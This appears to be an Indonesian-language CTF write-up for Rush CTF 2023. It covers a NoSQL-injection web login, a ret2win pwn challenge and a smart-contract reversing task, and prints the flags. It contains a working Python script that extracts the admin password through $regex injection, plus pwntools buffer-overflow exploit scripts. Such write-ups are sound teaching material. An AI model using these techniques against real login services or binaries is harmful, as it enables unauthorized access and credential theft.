# Rush CTF 2023

## Web

### SecureValut V2

> My SecureVault was Hacked last year. It was because of that damm SQL language, see if you can get my password now! Goodluck

[http://challs.ctf.cafe:9999](http://challs.ctf.cafe:9999/)

Pada challenge ini kita akan diberikan website login page seperti berikut:

![https://i.imgur.com/7kMqJ9b.png](https://i.imgur.com/7kMqJ9b.png)

Pada website itu kita dapat menggunakan teknik no-SQL injection di bagian post request.

![https://i.imgur.com/Ml4Cdbg.png](https://i.imgur.com/Ml4Cdbg.png)

Disini kita perlu meleak password dari admin, untuk mendapatkan flagnya. Disini saya akan menggunakan teknik regex di NOSQL untuk mendapatkan flagnya. Berikut script yang saya gunakan untuk mendapatkan flagnya.

```python
import requests
import string
from threading import Thread
from time import sleep

URL = "http://challs.ctf.cafe:9999"
FLAG = {"value": ""}

def send(char, url=URL):
    res = requests.post(
        url+"/login", json={
            "username": {"$regex": "admin"}, "password": {"$regex": "^"+char+".*"}
        })
    return res.text

def brute(char):
    print(char)
    a = send(char)
    if "Forbidden" not in a:
        sleep(2)
        FLAG['value'] += char[-1]
        print(FLAG)

j = 0
while True:
    for i in string.ascii_letters+string.digits+"{}_":
        j +=1
        a = Thread(target=brute, args=(FLAG['value']+i,))
        a.start()
        if (j%10) == 0:
            a.join()
```

![https://i.imgur.com/KLt97Tp.png](https://i.imgur.com/KLt97Tp.png)

## PWN

### Onyo

> Hello frend!Can you read flag.txt?

> nc challs.ctf.cafe 8888

> Author : Zerotistic

Diberikan sebuah ELF 64-bit, yang didalam hint sudah dijelaskan bahwa challenge kali ini bertipe **ret2win**, berikut rincian keamanannya dalam checksec

![https://i.imgur.com/kgdKGqZ.png](https://i.imgur.com/kgdKGqZ.png)

**PIE Disable & No Canary** sip, coba kita jalankan program tersebut

![https://i.imgur.com/vGEmIGr.png](https://i.imgur.com/vGEmIGr.png)

Kita disuruh mengirimkan input, saat kita selesai mengirimkan input tersebut, program akan memberi tahu kita bahwa ada fungsi **tersembunyi** yang kalau dipanggil akan ada sesuatu yang **wah** akan terjadi, dan fungsi tersebut bernama **please_call_me**, hmm…

Langsung aja kita disassemble fungsi main untuk mengetahui jumlah buffer yang diperlukan untuk **ret2win** karena kita ngga dikasih source codenya

![https://i.imgur.com/gjIvswK.png](https://i.imgur.com/gjIvswK.png)

Dari **main<+18>: lea rax,[rbp-0x4]** kita tau kalo buffernya disini **0x4** atau kalo di decimal yaitu **4** byte. Kalo udah dapet buffer tinggal kita cari fungsi yang namanya **please_call_me**

![https://i.imgur.com/xEJM7RJ.png](https://i.imgur.com/xEJM7RJ.png)

Dapetlah addressnya kita, tinggal craft payload terus tes ke remote aja.

```python
from pwn import *
from sys import *

p = process("./chall")
elf = context.binary = ELF("./chall", checksec=False)

cmd = """
b * main+30
"""

if(argv[1] == "gdb"):
	gdb.attach(p, cmd)
elif(argv[1] == "remote"):
	p = remote("challs.ctf.cafe",8888)

payload = cyclic(12)
payload += p64(elf.sym.please_call_me)

p.sendline(payload)
p.interactive()
```

Loh loh bang, katanya buffernya **4** byte, kok malah jadi **12**??? gimana sih…Jadi disini buffer emang **4** byte tapi kita perlu **8** byte lagi buat ngisi **RBP/Base Pointer**nya

Jadi kurang lebih memory layoutnya seperti ini

![https://i.imgur.com/ZIyzdYi.png](https://i.imgur.com/ZIyzdYi.png)

Kalo masih bingung bisa cek tutorial [disini](https://youtu.be/Oyw_i8L3t8c)

Oke lanjut, karena payload udah kita bikin, langsung aja tes ke remote

![https://i.imgur.com/bH1LDv2.png](https://i.imgur.com/bH1LDv2.png)

Lah kok gabisa dapet shell??? Terus gimana???Jadi hal kayak gini disebabin oleh [stack alignment](https://stackoverflow.com/questions/64729055/what-does-aligning-the-stack-mean-in-assembly)

Challenge ini juga mirip sama challenge COMPFEST14 2022 **Smart Identifier**, writeup punya ku bisa dilihat [disini](https://github.com/rennfurukawa/CTF-Writeup/tree/master/COMPFESTCTF2022/Binary%20Exploitation/Smart%20Identifier)

Untuk mengatasinya, kita cukup tambahin aja return address sebelum address **please_call_me** dipanggil, nyari address tersebut bisa pake **ROPgadget**

![https://i.imgur.com/X0tvoo3.png](https://i.imgur.com/X0tvoo3.png)

Tinggal craft lagi payloadnya terus tes ke server dan dapet deh flagnya.

```python
from pwn import *
from sys import *

p = process("./chall")
elf = context.binary = ELF("./chall", checksec=False)

cmd = """
b * main+30
"""

if(argv[1] == "gdb"):
	gdb.attach(p, cmd)
elif(argv[1] == "remote"):
	p = remote("challs.ctf.cafe",8888)

payload = cyclic(12)
payload += p64(0x000000000040101a) # return address
payload += p64(elf.sym.please_call_me)

p.sendline(payload)
p.interactive()
```

![https://i.imgur.com/BZWjuyD.png](https://i.imgur.com/BZWjuyD.png)

```
RUSH{D1d_y0u_s33_TH4t_M0m}
```

## Rev

### VitalikVault

> Can you reverse this smart-contract?
> Author : BrutiNicolas

Pada challenge ini kita akan diberikan source code dimana disana terdapat bytecode dari solidity, dan index.html yang jika dibuka dibrowser akan muncul seperti ini.

![https://i.imgur.com/7GuU0kT.png](https://i.imgur.com/7GuU0kT.png)

Dari sana kita mendapatkan beberapa file yang menarik yaitu.

- [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
- [https://coders-errand.com/logging-in-ethereum-part-2/](https://coders-errand.com/logging-in-ethereum-part-2/)
- [https://library.dedaub.com/decompile](https://library.dedaub.com/decompile)
- [https://www.evm.codes/?fork=merge](https://www.evm.codes/?fork=merge)

Untuk bytecode kita mendapatkan seperti ini:

```
608060405234801561001057600080fd5b506004361061002b5760003560e01c806353bd6d2214610030575b600080fd5b61004a60048036038101906100459190610380565b610060565b604051610057919061040a565b60405180910390f35b600073ab5801a7d398351b8be11c439e05c5b3259aec9b73ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146100ae57600080fd5b6126006113378518036101e4577fd99c58de1b06e3ebea3fcc471384836d2cb75955d84395dace86fba64505baab64525553487b6040516100ef9190610499565b60405180910390a17f101aa2511b4501cd6f4bedff54bee2f014409dfdf0c34e4a64b6f4f4e72d12a160001b8360405160200161012c9190610533565b60405160208183030381529060405280519060200120036101e3577f26b577bc367ce1111f29b7bb22eebb57a2086a020aa0c88c6c588e5b4cf0efdf6e4d684c674e377772326f427579636660405161018591906105c9565b60405180910390a160016002830110156101e2577f6751ff9969e5beee7bb9fd6731aba2e2a213bd96a1f54b0a24d11452a915ab96681f5b3a021c6444004f6040516101d19190610658565b60405180910390a1600190506101e9565b5b5b600090505b9392505050565b6000604051905090565b600080fd5b600080fd5b6000819050919050565b61021781610204565b811461022257600080fd5b50565b6000813590506102348161020e565b92915050565b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b61028d82610244565b810181811067ffffffffffffffff821117156102ac576102ab610255565b5b80604052505050565b60006102bf6101f0565b90506102cb8282610284565b919050565b600067ffffffffffffffff8211156102eb576102ea610255565b5b6102f482610244565b9050602081019050919050565b82818337600083830152505050565b600061032361031e846102d0565b6102b5565b90508281526020810184848401111561033f5761033e61023f565b5b61034a848285610301565b509392505050565b600082601f8301126103675761036661023a565b5b8135610377848260208601610310565b91505092915050565b600080600060608486031215610399576103986101fa565b5b60006103a786828701610225565b935050602084013567ffffffffffffffff8111156103c8576103c76101ff565b5b6103d486828701610352565b92505060406103e586828701610225565b9150509250925092565b60008115159050919050565b610404816103ef565b82525050565b600060208201905061041f60008301846103fb565b92915050565b6000819050919050565b60007fffffffffff00000000000000000000000000000000000000000000000000000082169050919050565b60008160d81b9050919050565b600061048361047e61047984610425565b61045b565b61042f565b9050919050565b61049381610468565b82525050565b60006020820190506104ae600083018461048a565b92915050565b600081519050919050565b600082825260208201905092915050565b60005b838110156104ee5780820151818401526020810190506104d3565b60008484015250505050565b6000610505826104b4565b61050f81856104bf565b935061051f8185602086016104d0565b61052881610244565b840191505092915050565b6000602082019050818103600083015261054d81846104fa565b905092915050565b6000819050919050565b60007fffffffffffffffffffffffffffffff000000000000000000000000000000000082169050919050565b60008160881b9050919050565b60006105b36105ae6105a984610555565b61058b565b61055f565b9050919050565b6105c381610598565b82525050565b60006020820190506105de60008301846105ba565b92915050565b6000819050919050565b60007fffffffffffffffffff000000000000000000000000000000000000000000000082169050919050565b60008160b81b9050919050565b600061064261063d610638846105e4565b61061a565b6105ee565b9050919050565b61065281610627565b82525050565b600060208201905061066d6000830184610649565b9291505056fea26469706673582212204f7f19c8f41f11ab0aea33bc0bc1e7722ca1e25002ff69eb851f46fd545a0ef664736f6c63430008120033
```

Dari byte code diatas kita bisa menggunakan [https://library.dedaub.com/decompile](https://library.dedaub.com/decompile) untuk mendecopile bytecode tersebut menjadi seperti ini.

```c
// Decompiled by library.dedaub.com
// 2023.03.06 16:50 UTC
// Compiled using the solidity compiler version 0.8.18

function () public payable { 
    revert();
}

function 0x53bd6d22(uint256 varg0, uint256 varg1, uint256 varg2) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 96);
    require(varg0 == varg0);
    require(varg1 <= 0xffffffffffffffff);
    require(4 + varg1 + 31 < 4 + (msg.data.length - 4));
    require(varg1.length <= 0xffffffffffffffff, Panic(65));
    v0 = new bytes[](varg1.length);
    require(!((v0 + ((varg1.length + 31 & ~0x1f) + 32 + 31 & ~0x1f) > 0xffffffffffffffff) | (v0 + ((varg1.length + 31 & ~0x1f) + 32 + 31 & ~0x1f) < v0)), Panic(65));
    require(varg1.data + varg1.length <= 4 + (msg.data.length - 4));
    CALLDATACOPY(v0.data, varg1.data, varg1.length);
    v0[varg1.length] = 0;
    require(varg2 == varg2);
    require(msg.sender == 0xab5801a7d398351b8be11c439e05c5b3259aec9b);
    if (!((varg0 ^ 0x1337) - 9728)) {
        emit 0xd99c58de1b06e3ebea3fcc471384836d2cb75955d84395dace86fba64505baab(0x525553487b000000000000000000000000000000000000000000000000000000);
        v1 = new array[](v1.data + 32 + 32 + (v0.length + 31 & ~0x1f) - MEM[64] - 32);
        v2 = v1.data;
        v1[0] = 32;
        v1[32] = v0.length;
        v3 = v4 = 0;
        while (v3 < v0.length) {
            MEM[v1.data + 32 + 32 + v3] = v0[v3];
            v3 = v3 + 32;
        }
        MEM[v1.data + 32 + 32 + v0.length] = 0;
        MEM[64] = v1.data + 32 + 32 + (v0.length + 31 & ~0x1f);
        v5 = v1.length;
        v6 = v1.data;
        if (!(keccak256(v1) - 0x101aa2511b4501cd6f4bedff54bee2f014409dfdf0c34e4a64b6f4f4e72d12a1)) {
            emit 0x26b577bc367ce1111f29b7bb22eebb57a2086a020aa0c88c6c588e5b4cf0efdf('MhLgN7wr2oBuycf');
            if (varg2 + 2 < 1) {
                emit 0x6751ff9969e5beee7bb9fd6731aba2e2a213bd96a1f54b0a24d11452a915ab96(0x1f5b3a021c6444004f0000000000000000000000000000000000000000000000);
                v7 = v8 = 1;
                goto 0x1e9B0x45;
            }
        }
    }
    v7 = v9 = 0;
    return v7;
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    require(!msg.value);
    if (msg.data.length >= 4) {
        if (0x53bd6d22 == function_selector >> 224) {
            0x53bd6d22();
        }
    }
    ();
}
```

Dari hint yang diberikan di index.html kita tau bahwa flag akan memiliki format seperti kreteria berikut.

```
The only informations that I have are the followings:

- The flag is cut in three parts and each part is emited once.

- The first part is emited in raw bytes.

- The second part is emited in base58 encoding.

- The last part has to be xored with the second part.

- Flag would be: EmitedFlagPart1 + base58Decode(EmitedFlagPart2) + xor(EmitedFlagPart2, EmitedFlagPart3).
```

Untuk flag pertama kita bisa dapatkan di sini, rubah menjadi hex, dan kita akan mendapatkan string `RUSH{`

![https://i.imgur.com/XMiC9tH.png](https://i.imgur.com/XMiC9tH.png)

Untuk flag kedua kita bisa dapatkan dari sini.

![https://i.imgur.com/IGasO6r.png](https://i.imgur.com/IGasO6r.png)

Decode ke dari base58 dan akan menghasilkan string `SuCh_4_M3t4`.

Untuk flag terakhir kita bisa dapatkan dengan mengxor variable yang ada di gambar dibawah ini dengan part ke 2 flag.

![https://i.imgur.com/1P9vqO4.png](https://i.imgur.com/1P9vqO4.png)

![https://i.imgur.com/XO8tz00.png](https://i.imgur.com/XO8tz00.png)

```c
flag: RUSH{SuCh_4_M3t4R3veRS3r}
```

## Our Team Writeup

Daffainfo [https://github.com/daffainfo/ctf-writeup/tree/main/Rush CTF 2023](https://github.com/daffainfo/ctf-writeup/tree/main/Rush%20CTF%202023)

List

- Web - Blog
- OSINT - Miss Bardot
- OSINT - Miss Bardot v2
- OSINT - Miss Bardot v3